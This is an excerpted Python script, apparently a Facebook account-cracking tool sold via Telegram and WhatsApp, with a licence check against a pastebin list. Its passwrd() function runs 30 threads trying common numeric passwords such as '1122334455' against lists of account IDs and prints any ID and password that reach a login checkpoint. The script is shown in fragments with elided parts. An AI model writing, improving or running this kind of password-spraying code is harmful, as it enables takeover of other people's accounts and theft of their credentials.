...
def banner():
	clear()
	print("""%s
ffffff       a     rrrrrrr    gggggg 
f           a a    r     r   g
f          a   a   rrrrrr    g
fffff     aaaaaa   r  r      g    gggg
f        a      a  r   r     g     g
f       a        a r    r    ggggggg

╔══════════════════════════════════════════╗
║ Creator  : farag & farouq             
║ 
║ Telegram : https://t.me/Xf0xff
║ Version  : 1                         
║ FILENAME : farag Lhsone                       
╚══════════════════════════════════════════╝
...
def chk():
  ...
  try: 
    httpCaht = requests.get("https://pastebin.com/raw/2rWDDwXp").text 
    if id in httpCaht: 
      ...
      os.system('xdg-open  https://wa.me/218944831283?text=*Hello*%2C%20*Okenwa*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*apk*%20*UPDATED*')
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
...
def menu(my_name,my_id):
	...
	print('%s[%s03%s] %s %s'%(P,P,P,P,P));time.sleep(0.02)
	print('%s[%s04%s] %s %s'%(P,P,P,P,P));time.sleep(0.02)
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['1122334455','1234554321','112233445566','123456654321''11223344556677']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{H}[OK] ﻲﻧﻭﺮﺘﻜﻟﻻﺍ ﺪﻳﺮﺒﻟﺍ {idf} | ﺰﻣﺮﻟﺍ {pw}{N}')
